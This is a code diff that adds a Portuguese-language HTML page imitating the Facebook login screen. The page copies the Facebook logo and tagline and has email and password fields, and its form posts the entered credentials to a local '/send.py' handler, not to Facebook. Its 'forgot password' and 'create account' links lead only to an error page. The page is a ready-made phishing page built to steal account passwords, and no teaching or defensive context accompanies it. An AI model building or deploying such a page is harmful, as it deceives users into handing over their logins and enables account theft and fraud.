@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook</title>
+  <link rel="stylesheet" type="" href="/static/css/style-home.css">
+</head>
+<body>
+  
+  <div class="title">
+    <img src="/static/images/4lCu2zih0ca.svg" alt="Facebook" id="img-logo">
+    <p id='p-title'>O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua vida.
+</p>
+  </div>  
+  
+  <form action="/send.py" method="POST">
+    <div class="login-area">
+    <div class="email-area">
+      <input type="email" name="user-email" value="" placeholder="Email Ou Telefone" />
+    </div>
+    <div class="passwd-area">
+      <input type="password" name="user-passwd" value="" placeholder="Senha" />
+    </div>
+    </div>
+    <div class="submit-area">
+      <button type="submit">Entrar</button>
+      <br>
+      <a href="./erro-page.html">Esqueci a Senha.</a>
+    </div>
+    <div class="new-account-area">
+      <button><a href="./erro-page.html">Criar Nova Conta</a></button>
+    </div>
+  
+
+
+  </form>
+
+
+</body>
+</html>
